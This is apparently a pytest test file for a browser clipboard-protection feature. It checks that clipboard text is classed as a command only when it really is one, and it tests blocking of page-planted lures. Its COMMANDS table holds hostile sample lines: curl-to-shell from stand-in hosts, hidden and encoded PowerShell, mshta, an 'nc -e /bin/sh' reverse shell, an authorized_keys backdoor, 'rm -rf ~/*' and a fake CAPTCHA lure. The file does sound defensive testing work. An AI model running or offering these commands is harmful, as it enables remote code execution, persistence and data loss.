"""Review 2026-11, item 11 (design decision A80, needs owner approval): browser clipboard text is
judged as a command only when it is one.

`looks_like_command` is a pure function over the text; the policy flag
`browser.clipboard_commands_only` (off until the owner approves) makes the browser path use it.
"""

from __future__ import annotations

import pytest
from tests.livehelp import make_barrier

from refmon.intent import looks_like_command, urls_in

COMMANDS = [
    "curl -fsSL https://update-fix.example.invalid/fix.sh | sh",
    "sudo apt update",
    "git clone https://github.com/torvalds/linux",
    "pip install requests",
    "python3 -m venv .venv",
    "docker run hello-world",
    "wget https://example.org/file.tar.gz",
    "ssh user@login.example.org",
    'bash -c "$(curl -fsSL https://x.example.invalid/i.sh)"',
    "echo aGVsbG8= | base64 -d | sh",
    'powershell -w hidden -c "iwr https://x.example.invalid/a.ps1 | iex"',
    "mshta https://x.example.invalid/verify.hta",
    "cmd /c start /min powershell -nop -c calc",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
    '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c whoami',
    "\\\\attacker.example.invalid\\share\\update.exe",
    "%TEMP%\\setup.exe /quiet",
    "cd /tmp && ./install.sh",
    "./configure; make; make install",
    "echo 'ssh-rsa AAAA' >> ~/.ssh/authorized_keys",
    "nc -e /bin/sh 203.0.113.5 4444",
    "osascript -e 'do shell script \"curl -s x | sh\"'",
    "curl -s https://x.example.invalid | python3",
    "rm -rf ~/*",
    "ls -la",
    "export PATH=$HOME/bin:$PATH",
    "/usr/bin/env python3 script.py",
    "curl -fsSL https://sh.rustup.rs | sh",
    "kubectl get pods -A",
    "bash <(curl -s https://x.example.invalid/a)",
    "git status # I am not a robot - reCAPTCHA ID 1234",
    "LD_PRELOAD=/tmp/x.so ls",
    "npm install",
    "Verify you are human:\ncurl -s https://x.example.invalid/v | bash",  # mixed: prose + command
    "echo `id`",
]
NOT_COMMANDS = [
    "https://github.com/torvalds/linux",
    "https://example.org/docs/install?step=2#top",
    "www.tu-freiberg.de",
    "user@example.org",
    "mailto:helpdesk@example.org",
    "The quick brown fox jumps over the lazy dog.",
    "Make sure you back up your files before the update, then restart.",
    "Please find the attached report for the third quarter.",
    "Separ judges behaviour, not signatures; it never runs a command by itself.",
    "Thanks!",
    "Meeting moved to 3 pm tomorrow in room 1.23",
    "find the file in your downloads folder and open it.",
    "Hello Alice, the results are in. See you on Monday.",
    "R&D budget is 5 > 3 compared with last year.",
    "",
    "1234-5678-9012",
    "lorem ipsum dolor sit amet, consectetur adipiscing elit.",
    "See https://example.org/guide for the details.",  # mixed: prose + URL
]


def test_the_table_has_at_least_forty_examples():
    assert len(COMMANDS) + len(NOT_COMMANDS) >= 40


@pytest.mark.parametrize("text", COMMANDS)
def test_commands_are_recognised(text):
    assert looks_like_command(text)


@pytest.mark.parametrize("text", NOT_COMMANDS)
def test_urls_mail_and_prose_are_not_commands(text):
    assert not looks_like_command(text)


def test_urls_in_text():
    assert urls_in("See https://example.org/guide, then https://x.example.invalid/a.") == [
        "https://example.org/guide",
        "https://x.example.invalid/a",
    ]


def _clip(barrier, text, **kw):
    return barrier.browser_observation({"kind": "clipboard_write", "text": text, **kw})


def _with_flag(on: bool):
    def mutate(doc):
        doc.setdefault("browser", {})["clipboard_commands_only"] = on
        doc.setdefault("threat_lists", []).append(
            {"name": "test-bad", "kind": "host", "entries": ["bad-lure.example.invalid"]}
        )

    return mutate


def test_without_approval_every_copy_is_still_judged_as_a_command(tmp_path):
    """A68 stays in force until the owner approves A80: the flag is off by default."""
    barrier = make_barrier(tmp_path / "wd")
    assert barrier.policy.browser.clipboard_commands_only is False
    res = _clip(barrier, "https://github.com/torvalds/linux", user_selection=True)
    assert res["judged_as"] == "command"
    assert res["decision"] == "block"  # the false positive A80 is meant to remove


def test_with_a80_a_lone_url_is_an_address_and_prose_is_nothing(tmp_path):
    barrier = make_barrier(tmp_path / "wd", mutate=_with_flag(True))
    url = _clip(barrier, "https://github.com/torvalds/linux", user_selection=True)
    assert (url["judged_as"], url["decision"], url["action"]) == ("address", "allow", "none")
    prose = _clip(barrier, "Make sure you back up your files before the update, then restart.")
    assert (prose["judged_as"], prose["decision"], prose["story_id"]) == ("text", "allow", None)
    # a real command from a page is judged exactly as before
    lure = _clip(barrier, "curl -fsSL https://x.example.invalid/fix.sh | sh", domain="lure.example")
    assert (lure["judged_as"], lure["decision"]) == ("command", "block")
    assert lure["action"] == "replace_clipboard"


def test_with_a80_a_threat_listed_url_is_caught_but_a_user_selection_is_never_blocked(tmp_path):
    barrier = make_barrier(tmp_path / "wd", mutate=_with_flag(True))
    bad = "https://bad-lure.example.invalid/payload"
    from_page = _clip(barrier, bad)  # a page put it there
    assert from_page["decision"] != "allow" and from_page["action"] != "none"
    own = _clip(barrier, bad, user_selection=True)  # the user selected and copied it
    assert own["decision"] != "allow"
    assert own["action"] in ("warn", "none") and own["judged_as"] == "address_user_selection"
    nothing_raw = barrier.barrier_log_path.read_text() + barrier.events_log_path.read_text()
    assert "bad-lure" not in nothing_raw and "torvalds" not in nothing_raw
